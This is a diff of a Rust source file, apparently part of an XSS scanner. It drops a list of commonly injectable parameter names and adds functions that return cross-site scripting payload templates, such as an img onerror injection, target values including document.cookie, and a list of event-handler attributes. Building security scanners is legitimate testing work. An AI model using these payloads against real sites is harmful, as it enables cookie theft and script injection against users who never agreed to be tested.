@@ -1,62 +1,41 @@
-pub fn GetGfXSS() -> Vec<&str> {
-	// https://github.com/1ndianl33t/Gf-Patterns/blob/master/xss.json
-	vec![
-		"q",
-		"s",
-		"search",
-		"lang",
-		"keyword",
-		"query",
-		"page",
-		"keywords",
-		"year",
-		"view",
-		"email",
-		"type",
-		"cat",
-		"name",
-		"p",
-		"callback",
-		"jsonp",
-		"api_key",
-		"api",
-		"password",
-		"email",
-		"emailto",
-		"token",
-		"username",
-		"csrf_token",
-		"unsubscribe_token",
-		"id",
-		"item",
-		"page_id",
-		"month",
-		"immagine",
-		"list_type",
-		"url",
-		"terms",
-		"categoryid",
-		"key",
-		"l",
-		"begindate",
-		"enddate",
-		"go",
-		"goto",
-		"host",
-		"html",
-		"image_url",
-		"img_url",
-		"data",
-		"domain",
-		"dir",
-		"feed",
-		"file",
-		"file_name",
-		"file_url",
-		"rurl",
-		"show",
-		"window",
-		"return",
-    ]
+pub fn get_jsvalue() -> Vec<String> {
+        vec![
+                "document.cookie".to_string(),
+                "document.location".to_string(),
+                "1".to_string(),
+            ]
 }
 
+pub fn get_jscmd() -> Vec<String> {
+        vec![
+                "<img src=x onerror=$JS_FUNC$`$JS_CMD$`>".to_string(),
+                "<h1 $JS_FUNC$`$JS_CMD$`>".to_string(),
+                "<h1 $JS_FUNC$($JS_CMD)".to_string(),
+            ]
+}
+
+pub fn get_htmltags() -> Vec<String> {
+        vec![
+                "<img src=x onerror=$JS_FUNC$`$JS_CMD$`>".to_string(),
+                "<h1 $JS_FUNC$`$JS_CMD$`>".to_string(),
+                "<h1 $JS_FUNC$($JS_CMD)".to_string(),
+            ]
+}
+
+pub fn get_attr() -> Vec<String> {
+        vec![
+                "onmouseover".to_string(),
+                "onmouseenter".to_string(),
+                "onmouseleave".to_string(),
+                "onmouseout".to_string(),
+                "onclick".to_string(),
+                "onmousedown".to_string(),
+                "onmouseup".to_string(),
+                "ontouchstart".to_string(),
+                "ontouchend".to_string(),
+                "ontouchmove".to_string(),
+                "onpointerenter".to_string(),
+                "onpointerleave".to_string(),
+                "onpointerover".to_string(),
+            ]
+}
